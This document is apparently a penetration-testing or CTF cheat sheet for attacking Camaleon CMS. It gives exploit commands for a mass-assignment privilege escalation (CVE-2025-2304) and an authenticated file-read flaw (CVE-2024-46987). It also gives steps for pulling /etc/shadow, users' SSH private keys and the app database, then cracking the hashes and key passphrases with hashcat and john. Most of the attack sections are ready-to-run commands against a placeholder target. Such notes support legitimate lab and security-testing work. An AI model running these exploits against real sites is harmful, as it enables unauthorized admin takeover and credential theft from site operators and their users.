# Camaleon CMS

Ruby-based CMS. Version often in footer: e.g. "Camaleon CMS ... Version 2.9.0".

**Paths:** `/admin/login`, `/admin/register` (registration may be open).

---

## Discovery

* Footer: "Copyright © ... Camaleon CMS. See intro. Version X.X.X"
* Admin: `http://TARGET/admin/login`, `http://TARGET/admin/register`
* Nuclei / feroxbuster with CMS wordlists can find themes and assets (`/assets/themes/camaleon_first/`, `/assets/camaleon_cms/`).

---

## CVE-2025-2304 – Mass assignment (user → admin)

Versions **prior to 2.8.1** allow mass assignment in the profile update: injecting `password[role]=admin` (and password fields) into the password update scope promotes the user to admin. **In practice the PoC has been confirmed on 2.9.0** — try it even if the footer shows a newer version. Some public PoCs also set the password to a fixed value (e.g. `admin`); after exploitation log in with the new password (e.g. `jack` / `admin`).

```bash
# PoC (creates admin from low-priv user; may change password to "admin")
python3 main.py --url http://TARGET --user jack --password jack123
# Then log in with jack / admin (or whatever the PoC sets)
```

**PoC:** https://github.com/7acini/CVE-2025-2304-CamaleonCMS-PoC

---

## CVE-2024-46987 – LFI (authenticated)

Authenticated LFI: arbitrary file read as the app user. Useful for `/etc/passwd`, `/etc/shadow`, SSH keys, nginx/config, and **`/proc/self/fd/N`** (open file descriptors — often the app’s SQLite DB).

**Binary files (DB):** The default PoC prints `r.text`; for SQLite you must save **bytes** (`r.content`). Modify the script to write `r.content` to a file (e.g. `/tmp/file.bytes`), then open with `sqlite3 /tmp/file.bytes`. Try `/proc/self/fd/7`, `/proc/self/fd/9`, etc. Tables like `cama_users` contain `password_digest` (bcrypt); crack with `hashcat -a0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`. SSH private keys read via LFI can be cracked with `ssh2john keyfile > key.hash` then `john --wordlist=rockyou.txt key.hash`.

```bash
# Read file
python3 CVE-2024-46987.py --url http://TARGET -l USER -p PASSWORD /etc/passwd
python3 CVE-2024-46987.py --url http://TARGET -l jack -p admin /etc/nginx/sites-available/default

# SSH keys (try both id_rsa and id_ed25519 per user from /etc/passwd)
python3 CVE-2024-46987.py --url http://TARGET -l jack -p admin /home/USER/.ssh/id_ed25519
python3 CVE-2024-46987.py --url http://TARGET -l jack -p admin /home/USER/.ssh/id_rsa

# App DB via open file descriptor (save response as bytes, not text)
python3 CVE-2024-46987.py --url http://TARGET -l jack -p admin /proc/self/fd/7
# In PoC: with open("/tmp/file.bytes", "wb") as fp: fp.write(r.content)
# Then: sqlite3 /tmp/file.bytes → .tables, select * from cama_users;
```

**Mass LFI:** Point the PoC at a wordlist (e.g. `/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt` or [LFI-WordList-Linux](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux)) to enumerate readable paths.

**Example — leaked key:** Reading `/home/trivia/.ssh/id_ed25519` returns the private key; if it is passphrase-protected, use `ssh2john id_ed25519 > key.hash` then `john --wordlist=/usr/share/wordlists/rockyou.txt key.hash`.

**PoC:** https://github.com/Goultarde/CVE-2024-46987

---

## Related CVEs (version-dependent)

* **CVE-2024-46986** – Arbitrary file write (prior to 2.8.2).
* **CVE-2023-30145** – SSTI via `formats` parameter (below 2.7.0; fixed in 2.7.4).

Check version in footer and run the appropriate exploit.
